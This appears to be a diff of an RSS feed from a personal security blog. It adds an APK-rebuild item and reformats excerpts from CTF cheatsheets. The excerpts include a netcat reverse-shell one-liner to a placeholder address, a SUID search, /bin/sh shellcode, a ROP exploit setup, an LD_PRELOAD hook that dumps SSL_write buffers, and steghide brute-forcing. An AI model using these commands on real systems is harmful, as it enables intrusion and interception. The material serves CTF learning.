@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>Master 0xCcC</title>
@@ -6,10 +6,21 @@
     <description>Recent content on Master 0xCcC</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Sat, 05 Oct 2019 10:41:06 +0200</lastBuildDate>
+    <lastBuildDate>Tue, 10 Dec 2019 00:00:00 +0000</lastBuildDate>
     
 	<atom:link href="https://masterccc.github.io/index.xml" rel="self" type="application/rss+xml" />
     
+    
+    <item>
+      <title>Apk - Edit and rebuild</title>
+      <link>https://masterccc.github.io/memo/edit_apk/</link>
+      <pubDate>Tue, 10 Dec 2019 00:00:00 +0000</pubDate>
+      
+      <guid>https://masterccc.github.io/memo/edit_apk/</guid>
+      <description>Cheatsheet - Apk rebuild for debug purpose This tutorial describes the different steps to edit and rebuild an apk from the apk file.
+Prerequisites This manipulation require to enable USB debugging in your android device (https://developer.android.com/studio/debug/dev-options) and have adb, apktool, jarsigner, keytool and zipalign installed on your computer. A rooted device is NOT needed.
+Get the apk from adb : First, get the path to the apk in your filesystem :</description>
+    </item>
     
     <item>
       <title>Reverse shell auto-complete</title>
@@ -26,7 +37,7 @@
       <pubDate>Fri, 04 Oct 2019 00:00:00 +0000</pubDate>
       
       <guid>https://masterccc.github.io/memo/process_com/</guid>
-      <description>Cheatsheet - Python subprocess communication Imports from subprocess import Popen, PIPE  Imports for signals import signal, os  Start process process = Popen([&#39;./sum 50&#39;], shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)  Check if process is alive def isAlive(process): poll = process.poll() if poll == None: print(&amp;quot;Program running...&amp;quot;) else: print(&amp;quot;Program stopped :(&amp;quot;)  Read from stdout def getline(process): return &amp;quot;stdout : &amp;quot; + process.stdout.readline().decode(&#39;utf-8&#39;)  Write to stdin process.stdin.write((str(i)+&amp;quot;\n&amp;quot;).encode()) process.stdin.flush()  Send signals os.</description>
+      <description>Cheatsheet - Python subprocess communication Imports from subprocess import Popen, PIPE Imports for signals import signal, os Start process process = Popen([&#39;./sum 50&#39;], shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE) Check if process is alive def isAlive(process): poll = process.poll() if poll == None: print(&#34;Program running...&#34;) else: print(&#34;Program stopped :(&#34;) Read from stdout def getline(process): return &#34;stdout : &#34; + process.stdout.readline().decode(&#39;utf-8&#39;) Write to stdin process.stdin.write((str(i)+&#34;\n&#34;).encode()) process.stdin.flush() Send signals os.kill(process.pid, signal.SIGSTOP) Available signals :</description>
     </item>
     
     <item>
@@ -46,7 +57,7 @@
       <guid>https://masterccc.github.io/memo/shellcode/</guid>
       <description>This memo explains the required steps to write you own shellcode. From C code (or assembly directly) to the shellcode&#39;s string. At the bottom of this page a code is present to test your shellcode.
 x86_64 Shellcode In this memo, the shellcode will launch /bin/sh. Let&#39;s take the following C code :
-#include &amp;lt;unistd.h&amp;gt; int main(void){ execve(&amp;quot;/bin/sh&amp;quot;, NULL, NULL); }  NULL parameters stands for args and environment, we don&#39;t need them for now.</description>
+#include  int main(void){ execve(&#34;/bin/sh&#34;, NULL, NULL); } NULL parameters stands for args and environment, we don&#39;t need them for now.</description>
     </item>
     
     <item>
@@ -64,8 +75,8 @@ x86_64 Shellcode In this memo, the shellcode will launch /bin/sh. Let&#39;s take
       <pubDate>Tue, 27 Aug 2019 00:00:00 +0000</pubDate>
       
       <guid>https://masterccc.github.io/memo/ctf/</guid>
-      <description>Cheatsheet - CTF Find SUID files find / -user root -perm -4000 -exec ls -ldb {} \;  Reverse shell without &amp;ldquo;nc -e /bin/sh&amp;rdquo; mknod /tmp/bp p /bin/sh 0&amp;lt;/tmp/bp | nc addr port 1&amp;gt;/tmp/bp  One-line :
-mknod /tmp/bp p ; /bin/sh 0&amp;lt;/tmp/bp | nc addr port 1&amp;gt;/tmp/bp  Spawn a TTY Python python -c &#39;import pty; pty.spawn(&amp;quot;/bin/sh&amp;quot;)&#39;  Shell /bin/sh -i  Other https://netsec.ws/?p=337</description>
+      <description>Cheatsheet - CTF Find SUID files find / -user root -perm -4000 -exec ls -ldb {} \; Reverse shell without &amp;ldquo;nc -e /bin/sh&amp;rdquo; mknod /tmp/bp p /bin/sh 0&amp;lt;/tmp/bp | nc addr port 1&amp;gt;/tmp/bp One-line :
+mknod /tmp/bp p ; /bin/sh 0&amp;lt;/tmp/bp | nc addr port 1&amp;gt;/tmp/bp Spawn a TTY Python python -c &#39;import pty; pty.spawn(&amp;quot;/bin/sh&amp;quot;)&#39; Shell /bin/sh -i Other https://netsec.ws/?p=337</description>
     </item>
     
     <item>
@@ -74,7 +85,7 @@ mknod /tmp/bp p ; /bin/sh 0&amp;lt;/tmp/bp | nc addr port 1&amp;gt;/tmp/bp  Spaw
       <pubDate>Tue, 27 Aug 2019 00:00:00 +0000</pubDate>
       
       <guid>https://masterccc.github.io/memo/rop_example/</guid>
-      <description>ROP x86_64  Local gets() x86_64 No setuid() No canary  Source code #include &amp;lt;stdio.h&amp;gt; int main() { char buffer[32]; puts(&amp;quot;Simple ROP.\n&amp;quot;); gets(buffer); return 0; }  Compilation gcc -o vuln vuln.c -fno-stack-protector -no-pie  $file vuln vuln: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=20e082fc91a594a5d0a331e84688a0d62b3b7b56, not stripped  ROP script # coding: utf-8 from pwn import * # Choose and run p = process(&amp;quot;.</description>
+      <description>ROP x86_64  Local gets() x86_64 No setuid() No canary  Source code #include &amp;lt;stdio.h&amp;gt; int main() { char buffer[32]; puts(&amp;quot;Simple ROP.\n&amp;quot;); gets(buffer); return 0; } Compilation gcc -o vuln vuln.c -fno-stack-protector -no-pie $file vuln vuln: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=20e082fc91a594a5d0a331e84688a0d62b3b7b56, not stripped ROP script # coding: utf-8 from pwn import * # Choose and run p = process(&amp;quot;./vuln&amp;quot;) # Inspect files binary = ELF(&amp;quot;.</description>
     </item>
     
     <item>
@@ -83,7 +94,7 @@ mknod /tmp/bp p ; /bin/sh 0&amp;lt;/tmp/bp | nc addr port 1&amp;gt;/tmp/bp  Spaw
       <pubDate>Wed, 07 Aug 2019 00:00:00 +0000</pubDate>
       
       <guid>https://masterccc.github.io/memo/asmx86args/</guid>
-      <description>Cheatsheet - x86 Args and local vars Source code int func(char a, char b, char c, char d, char e){ char f = 6, g = 7, h =8 ; printf(&amp;quot;%d %d %d %d %d\n&amp;quot;, a,b,c,d,e); return 0xC0FEE ; } int main(void){ printf(&amp;quot;%d&amp;quot;,func(1,2,3,4,5)); return 0; }  Gdb view  (gdb) disass main ... 0x00001238 &amp;lt;+29&amp;gt;: push 0x5 0x0000123a &amp;lt;+31&amp;gt;: push 0x4 0x0000123c &amp;lt;+33&amp;gt;: push 0x3 0x0000123e &amp;lt;+35&amp;gt;: push 0x2 0x00001240 &amp;lt;+37&amp;gt;: push 0x1 0x00001242 &amp;lt;+39&amp;gt;: call 0x1199 &amp;lt;func&amp;gt; .</description>
+      <description>Cheatsheet - x86 Args and local vars Source code int func(char a, char b, char c, char d, char e){ char f = 6, g = 7, h =8 ; printf(&amp;quot;%d %d %d %d %d\n&amp;quot;, a,b,c,d,e); return 0xC0FEE ; } int main(void){ printf(&amp;quot;%d&amp;quot;,func(1,2,3,4,5)); return 0; } Gdb view  (gdb) disass main ... 0x00001238 &amp;lt;+29&amp;gt;: push 0x5 0x0000123a &amp;lt;+31&amp;gt;: push 0x4 0x0000123c &amp;lt;+33&amp;gt;: push 0x3 0x0000123e &amp;lt;+35&amp;gt;: push 0x2 0x00001240 &amp;lt;+37&amp;gt;: push 0x1 0x00001242 &amp;lt;+39&amp;gt;: call 0x1199 &amp;lt;func&amp;gt; .</description>
     </item>
     
     <item>
@@ -92,14 +103,14 @@ mknod /tmp/bp p ; /bin/sh 0&amp;lt;/tmp/bp | nc addr port 1&amp;gt;/tmp/bp  Spaw
       <pubDate>Tue, 06 Aug 2019 00:00:00 +0000</pubDate>
       
       <guid>https://masterccc.github.io/memo/stego/</guid>
-      <description> Cheatsheet - Stego tools for pictures Stegoveritas Stegoveritas can be found here : https://github.com/bannsec/stegoVeritas
+      <description>Cheatsheet - Stego tools for pictures Stegoveritas Stegoveritas can be found here : https://github.com/bannsec/stegoVeritas
 Create several altered images (contrast/colors/brightness)
 Run with common options :
-$ stegoveritas -exif -meta -xmp -carve -imageTransform -BruteLSB -extractLSB -trailing massacre.png  Steghide Available in most of distro&amp;rsquo;s repos.
+$ stegoveritas -exif -meta -xmp -carve -imageTransform -BruteLSB -extractLSB -trailing massacre.png Steghide Available in most of distro&#39;s repos.
 Common run :
-steghide extract -sf file.jpg  Stegcracker Stegcracker can be found here : https://github.com/Paradoxis/StegCracker
+steghide extract -sf file.jpg Stegcracker Stegcracker can be found here : https://github.com/Paradoxis/StegCracker
 Performs a steghide bruteforce :
-stegcracker file.jpg /usr/share/wordlist/rockyou.txt  </description>
+stegcracker file.jpg /usr/share/wordlist/rockyou.txt </description>
     </item>
     
     <item>
@@ -117,8 +128,8 @@ stegcracker file.jpg /usr/share/wordlist/rockyou.txt  </description>
       <pubDate>Sat, 27 Jul 2019 00:00:00 +0000</pubDate>
       
       <guid>https://masterccc.github.io/memo/ld_preload/</guid>
-      <description> Cheatsheet - LD_PRELOAD trick ## Compilation
-gcc -o hook.so dlsym.c -ldl -fPIC -shared  Usage : LD_PRELOAD=$PWD/hook.so ./target  Examples Strcmp hook : #define _GNU_SOURCE #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;dlfcn.h&amp;gt; int strcmp(const char *s1, const char *s2){ printf(&amp;quot;Hook strcmp : strcmp(&#39;%s&#39;,&#39;%s&#39;)\n&amp;quot;, s1, s2); int (*true_strcmp)(const char*, const char*); true_strcmp = dlsym(RTLD_NEXT, &amp;quot;strcmp&amp;quot;); return true_strcmp(s1,s2); }  SSL inspector : #define _GNU_SOURCE #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; #include &amp;lt;dlfcn.h&amp;gt; #include &amp;lt;openssl/ssl.h&amp;gt; int SSL_write(SSL *context, const void *buffer, int size){ int (*orig_ssl_write)(SSL *context, const void *buffer, int size);	orig_ssl_write = dlysym(RTLD_NEXT,&amp;quot;SSL_write&amp;quot;); printf(&amp;quot;%s\n\n&amp;quot;, buffer); return orig_ssl_write(context, buffer, size); }  </description>
+      <description>Cheatsheet - LD_PRELOAD trick ## Compilation
+gcc -o hook.so dlsym.c -ldl -fPIC -shared Usage : LD_PRELOAD=$PWD/hook.so ./target Examples Strcmp hook : #define _GNU_SOURCE #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;dlfcn.h&amp;gt; int strcmp(const char *s1, const char *s2){ printf(&amp;quot;Hook strcmp : strcmp(&#39;%s&#39;,&#39;%s&#39;)\n&amp;quot;, s1, s2); int (*true_strcmp)(const char*, const char*); true_strcmp = dlsym(RTLD_NEXT, &amp;quot;strcmp&amp;quot;); return true_strcmp(s1,s2); } SSL inspector : #define _GNU_SOURCE #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; #include &amp;lt;dlfcn.h&amp;gt; #include &amp;lt;openssl/ssl.h&amp;gt; int SSL_write(SSL *context, const void *buffer, int size){ int (*orig_ssl_write)(SSL *context, const void *buffer, int size);	orig_ssl_write = dlysym(RTLD_NEXT,&amp;quot;SSL_write&amp;quot;); printf(&amp;quot;%s\n\n&amp;quot;, buffer); return orig_ssl_write(context, buffer, size); } </description>
     </item>
     
     <item>
@@ -129,9 +140,9 @@ gcc -o hook.so dlsym.c -ldl -fPIC -shared  Usage : LD_PRELOAD=$PWD/hook.so ./tar
       <guid>https://masterccc.github.io/reverse/cm_0232/</guid>
       <description>This is a crackme level 3 (Medium) from https://crackmes.one/crackme/5ab77f6533c5d40ad448cbc2
 Fast static analysis First, lets see what kind of file is it with file command :
-$ file crackme.02.32 crackme.02.32: ELF 32-bit LSB executable, Intel 80386, (SYSV), too many section (65535)  A 32 Bit ELF, with a beautiful &amp;ldquo;too many section&amp;rdquo;, no information about linkage or stripping. Lets go on.
+$ file crackme.02.32 crackme.02.32: ELF 32-bit LSB executable, Intel 80386, (SYSV), too many section (65535) A 32 Bit ELF, with a beautiful &amp;ldquo;too many section&amp;rdquo;, no information about linkage or stripping. Lets go on.
 Checking the strings in the binary :
-Judging from the &amp;ldquo;tracing not allowed&amp;rdquo; and &amp;ldquo;i&amp;rsquo;m sorry GDB.</description>
+Judging from the &amp;ldquo;tracing not allowed&amp;rdquo; and &amp;ldquo;i&#39;m sorry GDB.</description>
     </item>
     
     <item>
@@ -141,8 +152,8 @@ Judging from the &amp;ldquo;tracing not allowed&amp;rdquo; and &amp;ldquo;i&amp;
       
       <guid>https://masterccc.github.io/reverse/cm_thething/</guid>
       <description>This is a crackme level 2 (Easy) from https://crackmes.one/crackme/5ab77f5433c5d40ad448c1d6 )
-Fast static analysis First, let&amp;rsquo;s see what kind of file is it with file command :
-$ file thething thething: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), for GNU/Linux 2.4.1, dynamically linked, interpreter /lib/ld-linux.so.2, no section header  Ok, so 32 bits ELF and dynamically linked (this detail will be useful later). Not sure if stripped or not because of the &amp;ldquo;no section header&amp;rdquo;.</description>
+Fast static analysis First, let&#39;s see what kind of file is it with file command :
+$ file thething thething: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), for GNU/Linux 2.4.1, dynamically linked, interpreter /lib/ld-linux.so.2, no section header Ok, so 32 bits ELF and dynamically linked (this detail will be useful later). Not sure if stripped or not because of the &amp;ldquo;no section header&amp;rdquo;.</description>
     </item>
     
   </channel>
